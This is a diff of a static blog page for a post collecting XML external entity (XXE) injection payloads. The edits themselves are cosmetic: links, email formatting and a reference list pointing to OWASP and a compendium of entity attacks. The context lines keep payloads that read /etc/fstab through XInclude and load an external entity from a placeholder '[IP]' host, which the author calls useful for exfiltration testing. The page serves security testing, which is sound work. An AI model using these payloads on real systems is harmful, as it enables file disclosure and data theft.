@@ -61,6 +61,10 @@
 <ul>
 	
     <li>
+    	<a href="/blog/2015/01/09/gumbler-updates/">Search All Github Repositories for an Organization</a>
+    </li>
+    
+    <li>
     	<a href="/blog/2014/10/06/gumbler/">Searching Through Git Commits</a>
     </li>
     
@@ -90,7 +94,7 @@
         		<ul>
         			<li>Github - <a href="http://www.github.com/BuffaloWill" target="_blank">github.com/BuffaloWill</a></li>
                     <li>Twitter - <a href="http://www.twitter.com/_will_is_" target="_blank">@_will_is_</a></li>
-                    <li>Email - <a href="" target="_blank">will =AT= silentrobots.com</a></li>
+                    <li>Email - <a href="" target="_blank">will _at_ silentrobots.com</a></li>
         		</ul>
         	</li>
         </ul>
@@ -123,7 +127,7 @@
 <!-- more -->
 
 
-<p>XML headers:</p>
+<p>XML Headers:</p>
 
 <div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -179,7 +183,7 @@
 </span><span class='line'>&lt;xi:include href="file:///etc/fstab" parse="text"/&gt;</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 
-<p>URL handler. This follows <a href="http://publib.boulder.ibm.com/infocenter/wsadhelp/v5r1m2/topic/com.ibm.etools.xmlbuilder.doc/topics/cxmlcat.html">XML Entity - IBM</a>, I have not seen this work &ldquo;in the wild&rdquo;. Should be useful for exfiltration testing:</p>
+<p>URL handler. This follows <a href="http://publib.boulder.ibm.com/infocenter/wsadhelp/v5r1m2/topic/com.ibm.etools.xmlbuilder.doc/topics/cxmlcat.html]">XML Entity - IBM</a> I have not seen this work “in the wild”. Should be useful for exfiltration testing:</p>
 
 <div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE root [&lt;!ENTITY c PUBLIC "-//W3C//TEXT copyright//EN" "http://[IP]/copyright.xml"&gt;]&gt;</span></code></pre></td></tr></table></div></figure></notextile></div>
@@ -201,11 +205,12 @@
 
 <p>Useful Links:</p>
 
-<p><a href="http://publib.boulder.ibm.com/infocenter/wsadhelp/v5r1m2/topic/com.ibm.etools.xmlbuilder.doc/topics/cxmlcat.html">XML Entity Examples - IBM</a></p>
+<ul>
+<li><a href="http://publib.boulder.ibm.com/infocenter/wsadhelp/v5r1m2/topic/com.ibm.etools.xmlbuilder.doc/topics/cxmlcat.html">XML Entity Examples - IBM</a></li>
+<li><a href="http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf">XML Schema, DTD, and Entity Attacks - A Compendium of Known Techniques</a></li>
+<li><a href="https://www.owasp.org/index.php/Testing_for_XML_Injection_%28OTG-INPVAL-008%29">OWASP Testing for XML Entity Injection</a></li>
+</ul>
 
-<p><a href="http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf">XML Schema, DTD, and Entity Attacks - A Compendium of Known Techniques</a></p>
-
-<p><a href="https://www.owasp.org/index.php/Testing_for_XML_Injection_%28OTG-INPVAL-008%29">OWASP Testing for XML Entity Injection</a></p>
 </section>
 
 
